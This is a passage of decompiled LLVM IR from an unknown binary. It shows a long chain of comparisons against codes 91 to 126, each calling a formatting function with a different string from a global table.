  br i1 %v7_c1c0, label %dec_label_pc_c1c8, label %dec_label_pc_c1f0

dec_label_pc_c1c8:                                ; preds = %dec_label_pc_c1bc
  %v2_c1c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1d4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c1e0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c1ec = sext i8 %v3_c1d4 to i32
  %v6_c1ec = sext i8 %v3_c1e0 to i32
  %v8_c1ec = call i32 @szprintf(i32 %v2_c1c8, i32 ptrtoint ([13 x i8]* @global_var_1ee88.260 to i32), i32 %v4_c1ec, i32 %v6_c1ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1f0

dec_label_pc_c1f0:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_c1c8
  %v7_c1f4 = icmp eq i32 %v2_acd8, 92
  br i1 %v7_c1f4, label %dec_label_pc_c1fc, label %dec_label_pc_c224

dec_label_pc_c1fc:                                ; preds = %dec_label_pc_c1f0
  %v2_c1fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c208 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c214 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c220 = sext i8 %v3_c208 to i32
  %v6_c220 = sext i8 %v3_c214 to i32
  %v8_c220 = call i32 @szprintf(i32 %v2_c1fc, i32 ptrtoint ([13 x i8]* @global_var_1ee98.262 to i32), i32 %v4_c220, i32 %v6_c220, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c224

dec_label_pc_c224:                                ; preds = %dec_label_pc_c1f0, %dec_label_pc_c1fc
  %v7_c228 = icmp eq i32 %v2_acd8, 93
  br i1 %v7_c228, label %dec_label_pc_c230, label %dec_label_pc_c258

dec_label_pc_c230:                                ; preds = %dec_label_pc_c224
  %v2_c230 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c23c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c248 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c254 = sext i8 %v3_c23c to i32
  %v6_c254 = sext i8 %v3_c248 to i32
  %v8_c254 = call i32 @szprintf(i32 %v2_c230, i32 ptrtoint ([13 x i8]* @global_var_1eea8.264 to i32), i32 %v4_c254, i32 %v6_c254, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c258

dec_label_pc_c258:                                ; preds = %dec_label_pc_c224, %dec_label_pc_c230
  %v7_c25c = icmp eq i32 %v2_acd8, 94
  br i1 %v7_c25c, label %dec_label_pc_c264, label %dec_label_pc_c28c

dec_label_pc_c264:                                ; preds = %dec_label_pc_c258
  %v2_c264 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c270 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c27c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c288 = sext i8 %v3_c270 to i32
  %v6_c288 = sext i8 %v3_c27c to i32
  %v8_c288 = call i32 @szprintf(i32 %v2_c264, i32 ptrtoint ([13 x i8]* @global_var_1eb98.165 to i32), i32 %v4_c288, i32 %v6_c288, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c28c

dec_label_pc_c28c:                                ; preds = %dec_label_pc_c258, %dec_label_pc_c264
  %v7_c290 = icmp eq i32 %v2_acd8, 95
  br i1 %v7_c290, label %dec_label_pc_c298, label %dec_label_pc_c2c0

dec_label_pc_c298:                                ; preds = %dec_label_pc_c28c
  %v2_c298 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2a4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c2b0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c2bc = sext i8 %v3_c2a4 to i32
  %v6_c2bc = sext i8 %v3_c2b0 to i32
  %v8_c2bc = call i32 @szprintf(i32 %v2_c298, i32 ptrtoint ([13 x i8]* @global_var_1eeb8.266 to i32), i32 %v4_c2bc, i32 %v6_c2bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2c0

dec_label_pc_c2c0:                                ; preds = %dec_label_pc_c28c, %dec_label_pc_c298
  %v7_c2c4 = icmp eq i32 %v2_acd8, 96
  br i1 %v7_c2c4, label %dec_label_pc_c2cc, label %dec_label_pc_c2f4

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c2c0
  %v2_c2cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2d8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c2e4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c2f0 = sext i8 %v3_c2d8 to i32
  %v6_c2f0 = sext i8 %v3_c2e4 to i32
  %v8_c2f0 = call i32 @szprintf(i32 %v2_c2cc, i32 ptrtoint ([13 x i8]* @global_var_1ebc8.171 to i32), i32 %v4_c2f0, i32 %v6_c2f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2f4

dec_label_pc_c2f4:                                ; preds = %dec_label_pc_c2c0, %dec_label_pc_c2cc
  %v7_c2f8 = icmp eq i32 %v2_acd8, 97
  br i1 %v7_c2f8, label %dec_label_pc_c300, label %dec_label_pc_c328

dec_label_pc_c300:                                ; preds = %dec_label_pc_c2f4
  %v2_c300 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c30c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c318 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c324 = sext i8 %v3_c30c to i32
  %v6_c324 = sext i8 %v3_c318 to i32
  %v8_c324 = call i32 @szprintf(i32 %v2_c300, i32 ptrtoint ([14 x i8]* @global_var_1ed68.224 to i32), i32 %v4_c324, i32 %v6_c324, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c328

dec_label_pc_c328:                                ; preds = %dec_label_pc_c2f4, %dec_label_pc_c300
  %v7_c32c = icmp eq i32 %v2_acd8, 98
  br i1 %v7_c32c, label %dec_label_pc_c334, label %dec_label_pc_c35c

dec_label_pc_c334:                                ; preds = %dec_label_pc_c328
  %v2_c334 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c340 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c34c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c358 = sext i8 %v3_c340 to i32
  %v6_c358 = sext i8 %v3_c34c to i32
  %v8_c358 = call i32 @szprintf(i32 %v2_c334, i32 ptrtoint ([13 x i8]* @global_var_1eec8.268 to i32), i32 %v4_c358, i32 %v6_c358, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c35c

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c328, %dec_label_pc_c334
  %v7_c360 = icmp eq i32 %v2_acd8, 99
  br i1 %v7_c360, label %dec_label_pc_c368, label %dec_label_pc_c390

dec_label_pc_c368:                                ; preds = %dec_label_pc_c35c
  %v2_c368 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c374 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c380 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c38c = sext i8 %v3_c374 to i32
  %v6_c38c = sext i8 %v3_c380 to i32
  %v8_c38c = call i32 @szprintf(i32 %v2_c368, i32 ptrtoint ([14 x i8]* @global_var_1eed8.270 to i32), i32 %v4_c38c, i32 %v6_c38c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c390

dec_label_pc_c390:                                ; preds = %dec_label_pc_c35c, %dec_label_pc_c368
  %v7_c394 = icmp eq i32 %v2_acd8, 100
  br i1 %v7_c394, label %dec_label_pc_c39c, label %dec_label_pc_c3c4

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c390
  %v2_c39c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3a8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c3b4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c3c0 = sext i8 %v3_c3a8 to i32
  %v6_c3c0 = sext i8 %v3_c3b4 to i32
  %v8_c3c0 = call i32 @szprintf(i32 %v2_c39c, i32 ptrtoint ([14 x i8]* @global_var_1eee8.272 to i32), i32 %v4_c3c0, i32 %v6_c3c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3c4

dec_label_pc_c3c4:                                ; preds = %dec_label_pc_c390, %dec_label_pc_c39c
  %v7_c3c8 = icmp eq i32 %v2_acd8, 101
  br i1 %v7_c3c8, label %dec_label_pc_c3d0, label %dec_label_pc_c3f8

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3c4
  %v2_c3d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3dc = load i8, i8* @global_var_299b9.78, align 1
  %v3_c3e8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c3f4 = sext i8 %v3_c3dc to i32
  %v6_c3f4 = sext i8 %v3_c3e8 to i32
  %v8_c3f4 = call i32 @szprintf(i32 %v2_c3d0, i32 ptrtoint ([13 x i8]* @global_var_1eef8.274 to i32), i32 %v4_c3f4, i32 %v6_c3f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3f8

dec_label_pc_c3f8:                                ; preds = %dec_label_pc_c3c4, %dec_label_pc_c3d0
  %v7_c3fc = icmp eq i32 %v2_acd8, 102
  br i1 %v7_c3fc, label %dec_label_pc_c404, label %dec_label_pc_c42c

dec_label_pc_c404:                                ; preds = %dec_label_pc_c3f8
  %v2_c404 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c410 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c41c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c428 = sext i8 %v3_c410 to i32
  %v6_c428 = sext i8 %v3_c41c to i32
  %v8_c428 = call i32 @szprintf(i32 %v2_c404, i32 ptrtoint ([13 x i8]* @global_var_1ef08.276 to i32), i32 %v4_c428, i32 %v6_c428, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c42c

dec_label_pc_c42c:                                ; preds = %dec_label_pc_c3f8, %dec_label_pc_c404
  %v7_c430 = icmp eq i32 %v2_acd8, 103
  br i1 %v7_c430, label %dec_label_pc_c438, label %dec_label_pc_c460

dec_label_pc_c438:                                ; preds = %dec_label_pc_c42c
  %v2_c438 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c444 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c450 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c45c = sext i8 %v3_c444 to i32
  %v6_c45c = sext i8 %v3_c450 to i32
  %v8_c45c = call i32 @szprintf(i32 %v2_c438, i32 ptrtoint ([13 x i8]* @global_var_1ef18.278 to i32), i32 %v4_c45c, i32 %v6_c45c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c460

dec_label_pc_c460:                                ; preds = %dec_label_pc_c42c, %dec_label_pc_c438
  %v7_c464 = icmp eq i32 %v2_acd8, 104
  br i1 %v7_c464, label %dec_label_pc_c46c, label %dec_label_pc_c494

dec_label_pc_c46c:                                ; preds = %dec_label_pc_c460
  %v2_c46c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c478 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c484 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c490 = sext i8 %v3_c478 to i32
  %v6_c490 = sext i8 %v3_c484 to i32
  %v8_c490 = call i32 @szprintf(i32 %v2_c46c, i32 ptrtoint ([13 x i8]* @global_var_1ef28.280 to i32), i32 %v4_c490, i32 %v6_c490, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c494

dec_label_pc_c494:                                ; preds = %dec_label_pc_c460, %dec_label_pc_c46c
  %v7_c498 = icmp eq i32 %v2_acd8, 105
  br i1 %v7_c498, label %dec_label_pc_c4a0, label %dec_label_pc_c4c8

dec_label_pc_c4a0:                                ; preds = %dec_label_pc_c494
  %v2_c4a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4ac = load i8, i8* @global_var_299b9.78, align 1
  %v3_c4b8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c4c4 = sext i8 %v3_c4ac to i32
  %v6_c4c4 = sext i8 %v3_c4b8 to i32
  %v8_c4c4 = call i32 @szprintf(i32 %v2_c4a0, i32 ptrtoint ([13 x i8]* @global_var_1ef38.282 to i32), i32 %v4_c4c4, i32 %v6_c4c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4c8

dec_label_pc_c4c8:                                ; preds = %dec_label_pc_c494, %dec_label_pc_c4a0
  %v7_c4cc = icmp eq i32 %v2_acd8, 106
  br i1 %v7_c4cc, label %dec_label_pc_c4d4, label %dec_label_pc_c4fc

dec_label_pc_c4d4:                                ; preds = %dec_label_pc_c4c8
  %v2_c4d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4e0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c4ec = load i8, i8* @global_var_299ba.79, align 1
  %v4_c4f8 = sext i8 %v3_c4e0 to i32
  %v6_c4f8 = sext i8 %v3_c4ec to i32
  %v8_c4f8 = call i32 @szprintf(i32 %v2_c4d4, i32 ptrtoint ([12 x i8]* @global_var_1ef48.284 to i32), i32 %v4_c4f8, i32 %v6_c4f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4fc

dec_label_pc_c4fc:                                ; preds = %dec_label_pc_c4c8, %dec_label_pc_c4d4
  %v7_c500 = icmp eq i32 %v2_acd8, 107
  br i1 %v7_c500, label %dec_label_pc_c508, label %dec_label_pc_c530

dec_label_pc_c508:                                ; preds = %dec_label_pc_c4fc
  %v2_c508 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c514 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c520 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c52c = sext i8 %v3_c514 to i32
  %v6_c52c = sext i8 %v3_c520 to i32
  %v8_c52c = call i32 @szprintf(i32 %v2_c508, i32 ptrtoint ([14 x i8]* @global_var_1ef54.286 to i32), i32 %v4_c52c, i32 %v6_c52c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c530

dec_label_pc_c530:                                ; preds = %dec_label_pc_c4fc, %dec_label_pc_c508
  %v7_c534 = icmp eq i32 %v2_acd8, 108
  br i1 %v7_c534, label %dec_label_pc_c53c, label %dec_label_pc_c564

dec_label_pc_c53c:                                ; preds = %dec_label_pc_c530
  %v2_c53c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c548 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c554 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c560 = sext i8 %v3_c548 to i32
  %v6_c560 = sext i8 %v3_c554 to i32
  %v8_c560 = call i32 @szprintf(i32 %v2_c53c, i32 ptrtoint ([15 x i8]* @global_var_1ef64.288 to i32), i32 %v4_c560, i32 %v6_c560, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c564

dec_label_pc_c564:                                ; preds = %dec_label_pc_c530, %dec_label_pc_c53c
  %v7_c568 = icmp eq i32 %v2_acd8, 109
  br i1 %v7_c568, label %dec_label_pc_c570, label %dec_label_pc_c598

dec_label_pc_c570:                                ; preds = %dec_label_pc_c564
  %v2_c570 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c57c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c588 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c594 = sext i8 %v3_c57c to i32
  %v6_c594 = sext i8 %v3_c588 to i32
  %v8_c594 = call i32 @szprintf(i32 %v2_c570, i32 ptrtoint ([14 x i8]* @global_var_1ef74.290 to i32), i32 %v4_c594, i32 %v6_c594, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c598

dec_label_pc_c598:                                ; preds = %dec_label_pc_c564, %dec_label_pc_c570
  %v7_c59c = icmp eq i32 %v2_acd8, 110
  br i1 %v7_c59c, label %dec_label_pc_c5a4, label %dec_label_pc_c5cc

dec_label_pc_c5a4:                                ; preds = %dec_label_pc_c598
  %v2_c5a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5b0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c5bc = load i8, i8* @global_var_299ba.79, align 1
  %v4_c5c8 = sext i8 %v3_c5b0 to i32
  %v6_c5c8 = sext i8 %v3_c5bc to i32
  %v8_c5c8 = call i32 @szprintf(i32 %v2_c5a4, i32 ptrtoint ([13 x i8]* @global_var_1ef84.292 to i32), i32 %v4_c5c8, i32 %v6_c5c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5cc

dec_label_pc_c5cc:                                ; preds = %dec_label_pc_c598, %dec_label_pc_c5a4
  %v7_c5d0 = icmp eq i32 %v2_acd8, 111
  br i1 %v7_c5d0, label %dec_label_pc_c5d8, label %dec_label_pc_c600

dec_label_pc_c5d8:                                ; preds = %dec_label_pc_c5cc
  %v2_c5d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5e4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c5f0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c5fc = sext i8 %v3_c5e4 to i32
  %v6_c5fc = sext i8 %v3_c5f0 to i32
  %v8_c5fc = call i32 @szprintf(i32 %v2_c5d8, i32 ptrtoint ([14 x i8]* @global_var_1ef94.294 to i32), i32 %v4_c5fc, i32 %v6_c5fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c600

dec_label_pc_c600:                                ; preds = %dec_label_pc_c5cc, %dec_label_pc_c5d8
  %v7_c604 = icmp eq i32 %v2_acd8, 112
  br i1 %v7_c604, label %dec_label_pc_c60c, label %dec_label_pc_c634

dec_label_pc_c60c:                                ; preds = %dec_label_pc_c600
  %v2_c60c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c618 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c624 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c630 = sext i8 %v3_c618 to i32
  %v6_c630 = sext i8 %v3_c624 to i32
  %v8_c630 = call i32 @szprintf(i32 %v2_c60c, i32 ptrtoint ([15 x i8]* @global_var_1efa4.296 to i32), i32 %v4_c630, i32 %v6_c630, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c634

dec_label_pc_c634:                                ; preds = %dec_label_pc_c600, %dec_label_pc_c60c
  %v7_c638 = icmp eq i32 %v2_acd8, 113
  br i1 %v7_c638, label %dec_label_pc_c640, label %dec_label_pc_c668

dec_label_pc_c640:                                ; preds = %dec_label_pc_c634
  %v2_c640 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c64c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c658 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c664 = sext i8 %v3_c64c to i32
  %v6_c664 = sext i8 %v3_c658 to i32
  %v8_c664 = call i32 @szprintf(i32 %v2_c640, i32 ptrtoint ([13 x i8]* @global_var_1efb4.298 to i32), i32 %v4_c664, i32 %v6_c664, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c668

dec_label_pc_c668:                                ; preds = %dec_label_pc_c634, %dec_label_pc_c640
  %v7_c66c = icmp eq i32 %v2_acd8, 114
  br i1 %v7_c66c, label %dec_label_pc_c674, label %dec_label_pc_c69c

dec_label_pc_c674:                                ; preds = %dec_label_pc_c668
  %v2_c674 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c680 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c68c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c698 = sext i8 %v3_c680 to i32
  %v6_c698 = sext i8 %v3_c68c to i32
  %v8_c698 = call i32 @szprintf(i32 %v2_c674, i32 ptrtoint ([14 x i8]* @global_var_1efc4.300 to i32), i32 %v4_c698, i32 %v6_c698, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c69c

dec_label_pc_c69c:                                ; preds = %dec_label_pc_c668, %dec_label_pc_c674
  %v7_c6a0 = icmp eq i32 %v2_acd8, 115
  br i1 %v7_c6a0, label %dec_label_pc_c6a8, label %dec_label_pc_c6d0

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c69c
  %v2_c6a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6b4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c6c0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c6cc = sext i8 %v3_c6b4 to i32
  %v6_c6cc = sext i8 %v3_c6c0 to i32
  %v8_c6cc = call i32 @szprintf(i32 %v2_c6a8, i32 ptrtoint ([13 x i8]* @global_var_1efd4.302 to i32), i32 %v4_c6cc, i32 %v6_c6cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c69c, %dec_label_pc_c6a8
  %v7_c6d4 = icmp eq i32 %v2_acd8, 116
  br i1 %v7_c6d4, label %dec_label_pc_c6dc, label %dec_label_pc_c704

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c6d0
  %v2_c6dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6e8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c6f4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c700 = sext i8 %v3_c6e8 to i32
  %v6_c700 = sext i8 %v3_c6f4 to i32
  %v8_c700 = call i32 @szprintf(i32 %v2_c6dc, i32 ptrtoint ([13 x i8]* @global_var_1efe4.304 to i32), i32 %v4_c700, i32 %v6_c700, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c704

dec_label_pc_c704:                                ; preds = %dec_label_pc_c6d0, %dec_label_pc_c6dc
  %v7_c708 = icmp eq i32 %v2_acd8, 117
  br i1 %v7_c708, label %dec_label_pc_c710, label %dec_label_pc_c738

dec_label_pc_c710:                                ; preds = %dec_label_pc_c704
  %v2_c710 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c71c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c728 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c734 = sext i8 %v3_c71c to i32
  %v6_c734 = sext i8 %v3_c728 to i32
  %v8_c734 = call i32 @szprintf(i32 %v2_c710, i32 ptrtoint ([14 x i8]* @global_var_1eff4.306 to i32), i32 %v4_c734, i32 %v6_c734, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c738

dec_label_pc_c738:                                ; preds = %dec_label_pc_c704, %dec_label_pc_c710
  %v7_c73c = icmp eq i32 %v2_acd8, 118
  br i1 %v7_c73c, label %dec_label_pc_c744, label %dec_label_pc_c76c

dec_label_pc_c744:                                ; preds = %dec_label_pc_c738
  %v2_c744 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c750 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c75c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c768 = sext i8 %v3_c750 to i32
  %v6_c768 = sext i8 %v3_c75c to i32
  %v8_c768 = call i32 @szprintf(i32 %v2_c744, i32 ptrtoint ([14 x i8]* @global_var_1f004.308 to i32), i32 %v4_c768, i32 %v6_c768, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c76c

dec_label_pc_c76c:                                ; preds = %dec_label_pc_c738, %dec_label_pc_c744
  %v7_c770 = icmp eq i32 %v2_acd8, 119
  br i1 %v7_c770, label %dec_label_pc_c778, label %dec_label_pc_c7a0

dec_label_pc_c778:                                ; preds = %dec_label_pc_c76c
  %v2_c778 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c784 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c790 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c79c = sext i8 %v3_c784 to i32
  %v6_c79c = sext i8 %v3_c790 to i32
  %v8_c79c = call i32 @szprintf(i32 %v2_c778, i32 ptrtoint ([14 x i8]* @global_var_1f014.310 to i32), i32 %v4_c79c, i32 %v6_c79c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c76c, %dec_label_pc_c778
  %v7_c7a4 = icmp eq i32 %v2_acd8, 120
  br i1 %v7_c7a4, label %dec_label_pc_c7ac, label %dec_label_pc_c7d4

dec_label_pc_c7ac:                                ; preds = %dec_label_pc_c7a0
  %v2_c7ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7b8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c7c4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c7d0 = sext i8 %v3_c7b8 to i32
  %v6_c7d0 = sext i8 %v3_c7c4 to i32
  %v8_c7d0 = call i32 @szprintf(i32 %v2_c7ac, i32 ptrtoint ([15 x i8]* @global_var_1f024.312 to i32), i32 %v4_c7d0, i32 %v6_c7d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7a0, %dec_label_pc_c7ac
  %v7_c7d8 = icmp eq i32 %v2_acd8, 121
  br i1 %v7_c7d8, label %dec_label_pc_c7e0, label %dec_label_pc_c808

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7d4
  %v2_c7e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7ec = load i8, i8* @global_var_299b9.78, align 1
  %v3_c7f8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c804 = sext i8 %v3_c7ec to i32
  %v6_c804 = sext i8 %v3_c7f8 to i32
  %v8_c804 = call i32 @szprintf(i32 %v2_c7e0, i32 ptrtoint ([15 x i8]* @global_var_1ef64.288 to i32), i32 %v4_c804, i32 %v6_c804, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c808

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7d4, %dec_label_pc_c7e0
  %v7_c80c = icmp eq i32 %v2_acd8, 122
  br i1 %v7_c80c, label %dec_label_pc_c814, label %dec_label_pc_c83c

dec_label_pc_c814:                                ; preds = %dec_label_pc_c808
  %v2_c814 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c820 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c82c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c838 = sext i8 %v3_c820 to i32
  %v6_c838 = sext i8 %v3_c82c to i32
  %v8_c838 = call i32 @szprintf(i32 %v2_c814, i32 ptrtoint ([14 x i8]* @global_var_1f034.314 to i32), i32 %v4_c838, i32 %v6_c838, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c83c

dec_label_pc_c83c:                                ; preds = %dec_label_pc_c808, %dec_label_pc_c814
  %v7_c840 = icmp eq i32 %v2_acd8, 123
  br i1 %v7_c840, label %dec_label_pc_c848, label %dec_label_pc_c870

dec_label_pc_c848:                                ; preds = %dec_label_pc_c83c
  %v2_c848 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c854 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c860 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c86c = sext i8 %v3_c854 to i32
  %v6_c86c = sext i8 %v3_c860 to i32
  %v8_c86c = call i32 @szprintf(i32 %v2_c848, i32 ptrtoint ([12 x i8]* @global_var_1f044.316 to i32), i32 %v4_c86c, i32 %v6_c86c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c870

dec_label_pc_c870:                                ; preds = %dec_label_pc_c83c, %dec_label_pc_c848
  %v7_c874 = icmp eq i32 %v2_acd8, 124
  br i1 %v7_c874, label %dec_label_pc_c87c, label %dec_label_pc_c8a4

dec_label_pc_c87c:                                ; preds = %dec_label_pc_c870
  %v2_c87c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c888 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c894 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c8a0 = sext i8 %v3_c888 to i32
  %v6_c8a0 = sext i8 %v3_c894 to i32
  %v8_c8a0 = call i32 @szprintf(i32 %v2_c87c, i32 ptrtoint ([14 x i8]* @global_var_1f050.318 to i32), i32 %v4_c8a0, i32 %v6_c8a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c870, %dec_label_pc_c87c
  %v7_c8a8 = icmp eq i32 %v2_acd8, 125
  br i1 %v7_c8a8, label %dec_label_pc_c8b0, label %dec_label_pc_c8d8

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c8a4
  %v2_c8b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8bc = load i8, i8* @global_var_299b9.78, align 1
  %v3_c8c8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c8d4 = sext i8 %v3_c8bc to i32
  %v6_c8d4 = sext i8 %v3_c8c8 to i32
  %v8_c8d4 = call i32 @szprintf(i32 %v2_c8b0, i32 ptrtoint ([14 x i8]* @global_var_1f060.320 to i32), i32 %v4_c8d4, i32 %v6_c8d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8d8

dec_label_pc_c8d8:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c8b0
  %v7_c8dc = icmp eq i32 %v2_acd8, 126
  br i1 %v7_c8dc, label %dec_label_pc_c8e4, label %dec_label_pc_c90c

dec_label_pc_c8e4:                                ; preds = %dec_label_pc_c8d8
  %v2_c8e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8f0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c8fc = load i8, i8* @global_var_299ba.79, align 1
  %v4_c908 = sext i8 %v3_c8f0 to i32
  %v6_c908 = sext i8 %v3_c8fc to i32
  %v8_c908 = call i32 @szprintf(i32 %v2_c8e4, i32 ptrtoint ([14 x i8]* @global_var_1f050.318 to i32), i32 %v4_c908, i32 %v6_c908, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c90c

dec_label_pc_c90c:                                ; preds = %dec_label_pc_c8d8, %dec_label_pc_c8e4
